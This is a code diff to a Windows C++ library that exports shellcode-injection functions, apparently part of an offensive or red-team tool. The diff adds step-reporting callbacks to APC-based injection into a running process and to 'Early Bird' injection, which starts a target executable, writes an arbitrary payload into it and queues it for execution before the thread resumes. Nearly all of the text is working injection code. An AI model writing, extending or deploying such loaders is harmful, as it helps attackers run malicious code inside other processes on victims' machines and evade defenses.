@@ -114,7 +114,7 @@ extern "C" __declspec(dllexport) int InjectPayloadSimple(DWORD pid, unsigned cha
     return 0;
 }
 
-extern "C" __declspec(dllexport) int InjectPayloadApcMultiThreaded(DWORD pid, unsigned char* payload, SIZE_T length) {
+extern "C" __declspec(dllexport) int InjectPayloadApcMultiThreaded(DWORD pid, unsigned char* payload, SIZE_T length, StepCallback callback) {
     HANDLE hProcess;
     LPVOID blockMem;
     SIZE_T bytesWritten;
@@ -141,6 +141,8 @@ extern "C" __declspec(dllexport) int InjectPayloadApcMultiThreaded(DWORD pid, un
 
     if (hProcess == NULL) {
         return -1;
+    } else {
+        STEP(callback, "OpenProcess", 0);
     }
 
     blockMem = VirtualAllocEx(
@@ -154,6 +156,8 @@ extern "C" __declspec(dllexport) int InjectPayloadApcMultiThreaded(DWORD pid, un
     if (blockMem == NULL) {
         CloseHandle(hProcess);
         return -1;
+    } else {
+        STEP(callback, "VirtualAllocEx", 1);
     }
 
     LONG64 zero = 0;
@@ -161,6 +165,8 @@ extern "C" __declspec(dllexport) int InjectPayloadApcMultiThreaded(DWORD pid, un
         VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return -1;
+    } else {
+        STEP(callback, "WriteProcessMemory", 2);
     }
 
     LPVOID stubAddr = (BYTE*)blockMem + flagSize;
@@ -187,13 +193,15 @@ extern "C" __declspec(dllexport) int InjectPayloadApcMultiThreaded(DWORD pid, un
         VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return -1;
+    } else {
+        STEP(callback, "QueueUserAPC", 3);
     }
 
     CloseHandle(hProcess);
     return 0;
 }
 
-extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targetExe, unsigned char* payload, SIZE_T length) {
+extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targetExe, unsigned char* payload, SIZE_T length, StepCallback callback) {
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     LPVOID blockMem;
@@ -214,6 +222,8 @@ extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targe
         &pi
     )) {
         return -1;
+    } else {
+        STEP(callback, "CreateProcessA", 0);
     }
 
     blockMem = VirtualAllocEx(
@@ -229,6 +239,8 @@ extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targe
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         return -2;
+    } else {
+        STEP(callback, "VirtualAllocEx", 1);
     }
 
     if (!WriteProcessMemory(pi.hProcess, blockMem, payload, length, &bytesWritten)) {
@@ -245,6 +257,8 @@ extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targe
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         return -4;
+    } else {
+        STEP(callback, "WriteProcessMemory", 2);
     }
 
     if (!QueueUserAPC((PAPCFUNC)blockMem, pi.hThread, 0)) {
@@ -253,9 +267,12 @@ extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targe
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         return -5;
+    } else {
+        STEP(callback, "QueueUserAPC", 3);
     }
 
     ResumeThread(pi.hThread);
+    STEP(callback, "ResumeThread", 4);
 
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
